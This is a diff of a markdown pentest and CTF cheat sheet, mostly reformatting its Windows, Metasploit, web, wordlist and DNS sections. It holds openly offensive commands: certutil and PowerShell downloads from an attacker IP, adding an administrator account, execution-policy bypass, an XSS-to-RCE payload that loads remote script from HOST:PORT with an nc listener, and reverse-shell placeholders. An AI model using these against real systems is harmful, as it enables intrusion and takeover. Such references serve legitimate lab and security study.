@@ -235,6 +235,14 @@ $ psql -U <user>
 # SELECT * FROM demo;
 ```
 
+### SQLite
+```bash
+$ sqlite3 <filename>
+
+# .tables to get a list of tables.
+# SELECT .... to extract the content of a table using SQL.
+```
+
 ### Enumeration 
 * `cat /etc/*release` 
 * `cat /etc/issue `
@@ -271,90 +279,120 @@ $ psql -U <user>
 
 
 
-# Windows
-
+## Windows
 ### Adding User
-net user "USER_NAME" "PASS" /add
+- `net user "USER_NAME" "PASS" /add`
+
 ### Changing User's password
-net user "USER_NAME" "NEWPASS"
+- `net user "USER_NAME" "NEWPASS"`
+
 ### Adding User to Administrators
-net localgroup administrators "USER_NAME" /add
+- `net localgroup administrators "USER_NAME" /add`
+
 ### Changing File Permissions
-CACLS files /e /p {USERNAME}:{PERMISSION}<br/>
-Permissions:<br/>
-1.R `Read`<br/>
-2.W `Write`<br/>
-3.C `Change`<br/>
-4.F `Full Control`
+```powershell
+CACLS files /e /p {USERNAME}:{PERMISSION}
+# Permissions:
+# 1.R `Read`<br/>
+# 2.W `Write`<br/>
+# 3.C `Change`<br/>
+# 4.F `Full Control`
+```
 
 ### Set File bits
-attrib +r filename `add read only bit`<br/>
-attrib -r filename `remove read only bit`<br/>
-attrib +h filename `add hidden bit `<br/>
-attrib -h filename `remove hidden bit`
+- `attrib +r filename` add read only bit
+- `attrib -r filename` remove read only bit
+- `attrib +h filename` add hidden bit
+- `attrib -h filename` remove hidden bit
 
 ### Show hidden file/folder
-dir /a `show all hidden files & folder`<br/>
-dir /a:d `show only hidden folder`<br/>
-dir /a:h `show only hidden files`<br/>
+- `dir /a` show all hidden files & folder
+- `dir /a:d` show only hidden folder
+- `dir /a:h` show only hidden files
 
 ### Downloading Files
-`certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
-`powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`<br />
-`powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`
+- `certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`
+- `powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`
+- `powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`
 
 ### Active Directory
-`powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
-`. .\PowerView.ps1`      import the PowerView module
+```powershell
+powershell -ep bypass  # load a powershell shell with execution policy bypassed 
+. .\PowerView.ps1`     # import the PowerView module
+```
 
 ## List Drives
-`wmic logicaldisk get caption`
+```powershell
+wmic logicaldisk get caption
+```
 
 ## Decrypting PSCredential Object
-* $file = Import-Clixml -Path <path_to_file>
-* $file.GetNetworkCredential().username
-* $file.GetNetworkCredential().password
-# Msfvenom
+* `$file = Import-Clixml -Path <path_to_file>`
+* `$file.GetNetworkCredential().username`
+* `$file.GetNetworkCredential().password`
+
+## Msfvenom
 ### List All Payloads
-msfvenom -l payloads
+```bash
+$ msfvenom -l payloads
+```
+
 ### List Payload Format
-msfvenom --list formats
+```bash
+$ msfvenom --list formats
+```
 
-# Meterpreter
+## Meterpreter
 ### Adding user for RDP
-run getgui -u [USER_NAME] -p [PASS]
+```bash
+$ run getgui -u [USER_NAME] -p [PASS]
+```
 
-# Git
-
+## Git
 ### Dumping repository
-`./gitdumper.sh <location_of_remote_or_local_repostiory_having./.git> <destination_folder>`
+```bash
+./gitdumper.sh <location_of_remote_or_local_repostiory_having./.git> <destination_folder>
+```
 
 ### Extracting information from repository
-`./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>`
-
-# Web
-### XSS to RCE
+```bash
+$ ./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>
 ```
-Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
-Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
+
+## Web
+### XSS to RCE
+```bash
+# Attacker:
+while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
+
+#Victim: 
+<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
 ```
 
 ### SQL Map
-`sqlmap -r request.txt --dbms=mysql --dump`
+```bash
+$ sqlmap -r request.txt --dbms=mysql --dump
+```
 
 ### Wfuzz
-
-`wfuzz -c -z file,wordlist.txt --hh=0  http://<ip>/<path>/?date=FUZZ`
+```bash
+$ wfuzz -c -z file,wordlist.txt --hh=0  http://<ip>/<path>/?date=FUZZ
+```
 
 ### API (Applicaton Programmable Interface)
-
 * Check for possibility if there is a v1 , it is likely to be vulnerable to LFI 
-* Use wfuzz which is tool to fuzz for API end points or for parameter
-`wfuzz -u http://<ip>:<port>/<api-endpoint>\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404` <br/>
-Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_history` "?" is before the parameter and FUZZ is telling to find a parameter and we are looking for `.bash_hitory` as an example
+* Use `wfuzz` which is tool to fuzz for API end points or for parameter:
+
+    ```bash
+    $ wfuzz -u http://<ip>:<port>/<api-endpoint>\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
+    ```
+
+    Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_history` "?" is before the parameter and FUZZ is telling to find a parameter and we are looking for `.bash_hitory` as an example
 
 ### Web Shell Bash
-`bash -c "<bash_rev_shell>"`
+```bash
+$ bash -c "<bash_rev_shell>"
+```
 
 
 ### Wordpress
@@ -368,45 +406,60 @@ To bruteforce passwords
 After logging into the wordpress dashboard , we can edit theme's 404.php page with a php revershell
 `http://<ip>/wordpress/wp-content/themes/twentytwenty/404.php`
 
-# Wordlists
-
-### Directory Bruteforcing
-* /usr/share/wordlists/dirb/big.txt
-* /usr/share/wordlists/dirb/common.txt
-* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+## Directory Bruteforcing
+### Wordlists
+* `/usr/share/wordlists/dirb/big.txt`
+* `/usr/share/wordlists/dirb/common.txt`
+* `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
 
 ### Gobuster
 * `gobuster dir -u http://<ip>/ -w <path_to_wordlist>`
 * `gobuster dir -u http://<ip>/ -w <path_to_wordlist> -s "204,301,302,307,401,403"` (use status code if 200 is configured to respond on the web server to every get request)
 
 ### Feroxbuster
-`feroxbuster -u http://<ip>/ -w <path_to_wordlist>`
+```bash
+$ feroxbuster -u http://<ip>/ -w <path_to_wordlist>
+```
 
 ### Dirsearch
-`python3 dirsearch.py -u http://<ip>/ -w <path_to_text>`
+```bash
+# Full scan with recursive
+$ dirsearch -u https://wuvel.net -e html,txt,php,jpg,jpeg,png,css,js,bak,conf,ini,md -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
+
+# Deeper recursive
+$ dirsearch -u https://wuvel.net -e html,txt,php,jpg,jpeg,png,css,js,bak,conf,ini,md -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -R3
+
+# Excluding all the codes after -x flag
+$ dirsearch -u https://wuvel.net -e html,txt,php,jpg,jpeg,png,css,js,bak,conf,ini,md -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403,301,302
+```
 
 ### Credential Bruteforcing
-* /usr/share/wordlists/rockyou.txt
-* /usr/share/wordlists/fasstrackt.txt
+* `/usr/share/wordlists/rockyou.txt`
+* `/usr/share/wordlists/fastrack.txt`
 * using `crackstation`
 * using `seclists`
 
-# Generating Worlists for directory brute force
-
+## Generating Wordlists 
 ### Cewl 
-This spiders the given url and finding keyowrds then makes a wordlists through it's findings<br/>
-`cewl.rb <ip>`
+This spiders the given url and finding keyowrds then makes a wordlists through it's findings.
 
-# DNS
+```bash
+$ cewl <URL>
+<ip>
+```
 
+## DNS
 ### Finding Subdomains
-`wfuzz -c -w <path_to_wordlist> -u 'http://domain.com -H 'Host: FUZZ.domain.com`
+```bash
+$ wfuzz -c -w <path_to_wordlist> -u 'http://domain.com -H 'Host: FUZZ.domain.com
+```
 
 ### Zone Transfer
-
 If there is a port 53 open on the machine you could do a zone transfer to get information about DNS records
 
-`dig axfr @<ip> <domain_name>
+```bash
+$ dig axfr @<ip> <domain_name>
+```
 
 # King Of The Hill (KoTH)
 ### Monitoring and Closing Shell (Linux)
